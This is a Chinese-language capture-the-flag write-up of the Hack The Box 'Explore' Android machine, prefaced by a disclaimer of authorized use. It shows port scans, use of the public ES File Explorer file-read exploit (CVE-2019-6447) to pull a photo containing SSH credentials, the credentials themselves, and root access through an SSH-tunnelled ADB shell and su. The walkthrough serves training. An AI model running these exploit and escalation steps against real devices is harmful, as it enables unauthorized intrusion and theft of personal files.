# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。


# 服务探测
```
┌──(root💀kali)-[~/htb/Explore]
└─# nmap -p- 10.10.10.247 --open                  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-25 00:43 EST
Nmap scan report for 10.10.10.247
Host is up (0.25s latency).
Not shown: 65530 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
2222/tcp  open  EtherNetIP-1
38185/tcp open  unknown
42135/tcp open  unknown
59777/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 89.34 seconds


┌──(root💀kali)-[~/htb/Explore]
└─# nmap -sV -Pn 10.10.10.247 -p 2222,38185,42135,59777                                                         1 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-25 00:47 EST
Nmap scan report for 10.10.10.247
Host is up (0.24s latency).

PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
38185/tcp open  unknown
42135/tcp open  http    ES File Explorer Name Response httpd
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older


```

## 任意文件读取
搜索42135端口服务漏洞，存在一个任意文件读取漏洞
```
┌──(root💀kali)-[~/htb/Explore]
└─# searchsploit ES File Explorer
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
ES File Explorer 4.1.9.7.4 - Arbitrary File Read                                  | android/remote/50070.py
iOS iFileExplorer Free - Directory Traversal                                      | ios/remote/16278.py
MetaProducts Offline Explorer 1.x - FileSystem Disclosure                         | windows/remote/20488.txt
Microsoft Internet Explorer / MSN - ICC Profiles Crash (PoC)                      | windows/dos/1110.txt
Microsoft Internet Explorer 4.x/5 / Outlook 2000 0/98 0/Express 4.x - ActiveX '.C | windows/remote/19603.txt
Microsoft Internet Explorer 4/5 - DHTML Edit ActiveX Control File Stealing / Cros | windows/remote/19094.txt
Microsoft Internet Explorer 5 - ActiveX Object For Constructing Type Libraries Fo | windows/remote/19468.txt
Microsoft Internet Explorer 5 / Firefox 0.8 / OmniWeb 4.x - URI Protocol Handler  | windows/remote/24116.txt
Microsoft Internet Explorer 5/6 - 'file://' Request Zone Bypass                   | windows/remote/22575.txt
Microsoft Internet Explorer 6 - '%USERPROFILE%' File Execution                    | windows/remote/22734.html
Microsoft Internet Explorer 6 - Local File Access                                 | windows/remote/29619.html
Microsoft Internet Explorer 7 - Arbitrary File Rewrite (MS07-027)                 | windows/remote/3892.html
My File Explorer 1.3.1 iOS - Multiple Web Vulnerabilities                         | ios/webapps/28975.txt
WebFileExplorer 3.6 - 'user' / 'pass' SQL Injection                               | php/webapps/35851.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

拷贝到当前目录
```
┌──(root💀kali)-[~/htb/Explore]
└─# searchsploit -m android/remote/50070.py
  Exploit: ES File Explorer 4.1.9.7.4 - Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50070
     Path: /usr/share/exploitdb/exploits/android/remote/50070.py
File Type: Python script, ASCII text executable

Copied to: /root/htb/Explore/50070.py

```

查看exp支持命令
```
┌──(root💀kali)-[~/htb/Explore]
└─# python3 50070.py id 10.10.10.247                                                                            1 ⨯
[-] WRONG COMMAND!
Available commands : 
  listFiles         : List all Files.
  listPics          : List all Pictures.
  listVideos        : List all videos.
  listAudios        : List all audios.
  listApps          : List Applications installed.
  listAppsSystem    : List System apps.
  listAppsPhone     : List Communication related apps.
  listAppsSdcard    : List apps on the SDCard.
  listAppsAll       : List all Application.
  getFile           : Download a file.
  getDeviceInfo     : Get device info.

```

查看目标系统中所有照片
```
┌──(root💀kali)-[~/htb/Explore]
└─# python3 50070.py listPics 10.10.10.247 

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

name : concept.jpg
time : 4/21/21 02:38:08 AM
location : /storage/emulated/0/DCIM/concept.jpg
size : 135.33 KB (138,573 Bytes)

name : anc.png
time : 4/21/21 02:37:50 AM
location : /storage/emulated/0/DCIM/anc.png
size : 6.24 KB (6,392 Bytes)

name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)

name : 224_anc.png
time : 4/21/21 02:37:21 AM
location : /storage/emulated/0/DCIM/224_anc.png
size : 124.88 KB (127,876 Bytes)

```

发现一个叫creds.jpg的照片，下载到本地
```
┌──(root💀kali)-[~/htb/Explore]
└─# python3 50070.py getFile 10.10.10.247 /storage/emulated/0/DCIM/creds.jpg                                     

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.

```

转成jpg
```
┌──(root💀kali)-[~/htb/Explore]
└─# mv out.dat creds.jpg 
```

发现了一个用户凭据：

```kristi:Kr1sT!5h@Rp3xPl0r3!```

# foodhold

登录到系统，拿到foothold
```
┌──(root💀kali)-[~/htb/Explore]
└─# ssh kristi@10.10.10.247 -p 2222                                                                           255 ⨯
Password authentication
(kristi@10.10.10.247) Password: 
:/ $ whoami
u0_a76
:/ $ id
uid=10076(u0_a76) gid=10076(u0_a76) groups=10076(u0_a76),3003(inet),9997(everybody),20076(u0_a76_cache),50076(all_a76) context=u:r:untrusted_app:s0:c76,c256,c512,c768

```

查看系统信息，是一台安卓机器
```
:/ $ uname -a
Linux localhost 4.9.214-android-x86_64-g04f9324 #1 SMP PREEMPT Wed Mar 25 17:11:29 CST 2020 x86_64
```

在sdcard找到user.txt
```
:/sdcard $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
Android Download Music  Pictures      Ringtones dianxinos 
:/sdcard $ cat user.txt
f32017174......
:/sdcard $ pwd
/sdcard

```

# 提权

## adb

什么是adb？
>ndroid 调试桥 (adb) 是一种功能多样的命令行工具，可让您与设备进行通信。adb 命令可用于执行各种设备操作（例如安装和调试应用），并提供对 Unix shell（可用来在设备上运行各种命令）的访问权限。它是一种客户端-服务器程序，包括以下三个组件：

>客户端：用于发送命令。客户端在开发机器上运行。您可以通过发出 adb 命令从命令行终端调用客户端。
>守护程序 (adbd)：用于在设备上运行命令。守护程序在每个设备上作为后台进程运行。
>服务器：用于管理客户端与守护程序之间的通信。服务器在开发机器上作为后台进程运行。

简单来说就是电脑连接安卓的一个shell，一般运行在5555端口，但是这台靶机并没有对外开放这个端口

用ssh做一个转发服务
```ssh kristi@10.10.10.247 -L 5555:localhost:5555 -p 2222```

kali端连接本地5555端口
```
┌──(root💀kali)-[~/htb/Explore]
└─# adb connect localhost:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to localhost:5555

```

列出连接的设备
```
┌──(root💀kali)-[~/htb/Explore]
└─# adb devices                                                                                                 1 ⨯
List of devices attached
emulator-5554   device
localhost:5555  device

```

切换成shell，再用su提权到root
```
┌──(root💀kali)-[~/htb/Explore]
└─# adb -s localhost shell                                                                                      1 ⨯
x86_64:/ $ id                                                                                                      
uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid) context=u:r:shell:s0
x86_64:/ $ whoami
shell
x86_64:/ $ su
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0
:/ # whoami
root
:/ # cat /data/root.txt
f04fc82b....

```